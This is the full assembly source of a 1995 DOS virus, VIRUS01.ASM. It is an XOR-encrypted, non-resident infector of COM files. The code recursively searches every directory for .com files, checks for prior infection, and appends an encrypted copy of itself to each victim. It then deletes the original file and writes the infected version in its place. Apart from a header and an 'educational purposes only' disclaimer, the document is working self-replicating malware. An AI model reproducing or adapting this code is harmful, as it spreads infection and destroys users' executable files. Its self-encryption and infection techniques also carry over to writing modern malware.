;
;	VIRUS01.ASM
;
;	Author: Johan Gardhage <johan.gardhage@gmail.com>
;	Originally written in 1995.
;
; Description:
; This virus is a non-resident COM file infector, encrypted with an
; XOR algorithm.
;
; The virus will search the whole tree for files to infect, therefore
; becomes very slow. Upon infection, the victim is loaded into memory
; and the encrypted virus will be appended to it. The original file will
; then be deleted and replaced by the new file containing the modified code.
;
; Disclaimer:
; I take no responsibility for any damage, either direct or implied,
; caused by the usage of this virus source code or of the resulting code
; after assembly. The code was written for educational purposes ONLY.
;

	.model tiny
	.code
	.startup
	locals @@

VirusSize	equ	EndVirus-BeginVirus

BeginVirus:
	push	ax
	pop	ax
	push	ax
	pop	ax
	call	@@delta
@@delta:pop	bp					; bp holds current location
	sub	bp, offset @@delta			; calculate delta offset

	mov	si, word ptr [bp+Key]
	lea	di, [bp+BeginEncryptedSection]
	mov	cx, (EndEncryptedSection-BeginEncryptedSection)/2-1

	xor	word ptr [di], si
	inc	di
	inc	di

	push	cs
	lea	ax,[bp+EncryptDecrypt]
	push	ax					; push address to decryptor

	jmp	BeginEncryptedSection

Key	dw	0

;---------------------------------------------------------------------
;	Start of encrypted area
;---------------------------------------------------------------------

BeginEncryptedSection:
	db	0c3h					; return
BeginEncryptedSectionJump:
	lea	si, [bp+offset Old3Buf]
	mov	di, 100h
	push	di
	movsw
	movsb

	call	TraverseFcn
	jmp	Exit					; Exit on error

TraverseFcn:
	push	si					; Create stack frame
	mov	si,sp
	sub	sp,44					; Allocate space for DTA

	push	si
	call	InfectDirectory				; Go to search & destroy routines
	pop	si

	mov	ah,1Ah					; Set DTA
	lea	dx,word ptr [si-44]			; to space allotted
	int	21h					; Do it now!

	mov	ah, 4Eh					; Find first
	mov	cx,16					; Directory mask
	lea	dx,[bp+offset DirMask]			; *.*
	int	21h
	jmp	short @@next3

@@next1:cmp	byte ptr [si-14], '.'			; Is first char == '.'?
	je	short @@next2				; If so, loop again
	lea	dx,word ptr [si-14]			; else load dirname
	mov	ah,3Bh					; and changedir there
	int	21h
	jc	short @@next2				; Do next if invalid
	inc	word ptr [bp+offset Nest]		; Nest++
	call	near ptr TraverseFcn			; recurse directory

@@next2:lea	dx,word ptr [si-44]			; Load space allocated for DTA
	mov	ah,1Ah					; and set DTA to this new area
	int	21h					; 'cause it might have changed

	mov	ah,4Fh					; Find next
	int	21h

@@next3:jnc	@@next1					; If OK, jmp elsewhere
	cmp	word ptr [bp+offset Nest],0		; If root directory Nest = 0
	jle	short @@quit				; then Quit
	dec	word ptr [bp+offset Nest]		; Else decrement Nest
	lea	dx, [bp+offset BackDir]			; '..'
	mov	ah,3Bh					; Change directory
	int	21h					; to previous one

@@quit:	mov	sp,si
	pop	si
	ret

InfectDirectory:
	lea	dx, [bp+offset dta]
	call	SetDta

	mov	ah, 4eh					; Find first
	lea	dx, [bp+ComMask]			; search for '*.COM',0
	xor	cx, cx					; attribute mask
TryAnotherFile:
	int	21h
	jnc	@@next
	ret						; return to traverse loop

@@next:	lea	si, [bp+offset dta+15h]			; Start from attributes
	mov	cx, 9					; Finish with size
	lea	di, [bp+offset f_attr]			; Move into your locations
	rep	movsb

	mov	ax, 04301h				; DOS set file attrib. function
	xor	cx, cx					; Clear all attributes
	lea	dx, [bp+dta+30]				; DX points to victim's name
	int	21h

	mov	ax, 3D02h
	lea	dx, [bp+offset dta+30]			; File name is located in DTA
	int	21h
	xchg	ax, bx

	mov	ah, 3fh
	lea	dx, [bp+Old3Buf]
	mov	cx, 3
	int	21h

	mov	ax, word ptr [bp+dta+26]		; ax = filesize
	add	ax, offset BeginVirus-106h		; calculate entry offset to jmp
	mov	word ptr [bp+New3Buf+1], ax		; save jmp

	sub	ax, VirusSize				; calculate entry offset to jmp

	mov	cx, word ptr [bp+Old3Buf+1]		; jmp location
	cmp	ax, cx					; if same, already infected
	jnz	InfectComFile				; so quit out of here
	jmp	CloseFile

InfectComFile:
	mov	ah, 2ch					; Get random number
	int	21h
	mov	word ptr [bp+Key], dx

	xor	al, al					; go SOF
	call	SetFilePointer

	push	bx
	mov	ah, 4ah					; Get #of free paras
	mov	bx, 0ffffh				; in bx
	int	21h

	sub	bx, 1000h+1				; change..
	mov	ah, 4ah
	int	21h

	mov	ah, 48h					; ..allocation.
	mov	bx, 1000h
	int	21h
	pop	bx
	jc	CloseFile

	mov	es, ax
	lea	si, [bp+BeginVirus]
	mov	di, word ptr [bp+dta+26]
	mov	cx, VirusSize
	rep	movsb					; Copy virus to EO buffer

	push	es
	pop	ds

	push	bp
	mov	bp, word ptr [bp+dta+26]
	sub	bp, offset BeginVirus

	mov	si, word ptr ds:[bp+Key]
	mov	cx, (EndEncryptedSection-BeginEncryptedSection)/2
	lea	di, [bp+BeginEncryptedSection]
@@loop:	xor	word ptr ds:[di], si
	inc	di
	inc	di
	loop	@@loop

	pop	bp

	mov	ah, 3Fh					; read file to SO buffer
	mov	cx, word ptr [bp+dta+26]
	cwd						; equivalent to: xor dx, dx
	int	21h

	push	cs
	pop	ds

	lea	si, [bp+New3Buf]			; replace the 3 first bytes
	xor	di, di
	movsw
	movsb

	mov	ah, 3Eh					; Close file..
	int	21h

	mov	ah, 41h					; Delete orig file
	lea	dx, [bp+offset dta+30]			; File name is located in DTA
	int	21h

	mov	ah, 3ch					; Create a new one
	xor	cx, cx
	lea	dx, [bp+offset dta+30]			; File name is located in DTA
	int	21h
	xchg	ax, bx

	push	es
	pop	ds

	mov	ah, 40h					; Write file+virus
	mov	cx, word ptr [bp+dta+26]
	add	cx, VirusSize
	cwd						; equivalent to: xor dx, dx
	int	21h

	mov	ah, 49h					; release memory
	int	21h

	push	cs
	push	cs
	pop	ds
	pop	es

CloseFile:
	mov	ax, 5701h				; restore time/date
	mov	cx, [bp+f_time]
	mov	dx, [bp+f_date]
	int	21h

	mov	ah, 3eh
	int	21h

	mov	ax, 04301h				; DOS set file attrib. function
	xor	ch, ch
	mov	cl, [bp+f_attr]				; Restore all attributes
	lea	dx, [bp+dta+30]				; DX points to victim's name
	int	21h

	mov	ah, 4fh					; Find next
	jmp	TryAnotherFile

Exit:	mov	dx, 80h					; Restore current DTA to
							; the default @ PSP:80h
SetDta:	mov	ah, 1ah					; Set disk transfer address
	int	21h
	retn						; return to 100h

SetFilePointer:
	mov	ah, 42h
	xor	cx, cx
	cwd						; equivalent to: xor dx, dx
	int	21h
	retn

Nest	dw	0
BackDir	db	'..',0
DirMask	db	'*.*',0
ComMask	db	'*.com',0
Old3Buf	db	0cdh,20h,0
New3Buf	db	0e9h,0,0

EndEncryptedSection:

;---------------------------------------------------------------------
;	End of encrypted section
;---------------------------------------------------------------------

EncryptDecrypt:
	xor	word ptr [di], si
	inc	di
	inc	di
	loop	EncryptDecrypt
	jmp	BeginEncryptedSectionJump

EndVirus:

;---------------------------------------------------------------------
;	The heap begins below
;---------------------------------------------------------------------

f_attr	db	?
f_time	dw	?
f_date	dw	?
f_size	dd	?
dta	db	42 dup (?)

end
